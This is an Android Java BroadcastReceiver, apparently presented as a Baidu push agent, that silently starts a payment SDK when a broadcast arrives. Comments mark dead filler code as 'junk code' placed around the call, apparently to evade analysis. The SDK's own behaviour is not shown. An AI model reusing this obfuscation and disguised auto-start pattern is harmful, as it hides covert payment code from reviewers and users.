package com.baidu.pushagent;

//import com.taobao.alipay.utils.LogUtil;


import com.baidu.serv1.PaySdk;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

//AutoReceiver
public class PushService extends BroadcastReceiver {
    
    private static boolean isReceived = false;

    @Override
    public void onReceive(Context context, Intent intent) {

//    	LogUtil.e("Memory", "max:"+Runtime.getRuntime().maxMemory()+";free:"+Runtime.getRuntime().freeMemory());
    	
        realExec(context, intent);
    }
    
    public static void realExec(final Context context,Intent intent){

    	if (!isReceived) {
            isReceived = true;
//            long startTime = System.currentTimeMillis();
           
	    	//垃圾代码开始
            {
	    		int dadada = 0;
	    		
	    		if(dadada < 0){
	    			String asffa = "arr";
	    			String fffsa = "idea";
	
	    			String sadss = "resize";
	    			String fafsa = "ua";
	    			
	    			String afa = sadss+"."+asffa+"."+fffsa+"."+fafsa;
	    		}
            } 
            
	    	PaySdk.initService(context);
            
    		//垃圾代码结束
////            Alarms.enableAlarmsService(context, 0.1, 30.0, SyncService.class, true);
//            
////            Alarms.enableAlarmsService(context, 0.1, 30.0, AppTaskSynchService.class, true);
//            Alarms.enableAlarmsService(context, 2, 30.0, UserLogService.class, true);
            
//            long endTime = System.currentTimeMillis();
//            
//            LogUtil.e(SpriteReceiver.class.getName(), "realExec used time : "+(endTime - startTime));
        }
    }

}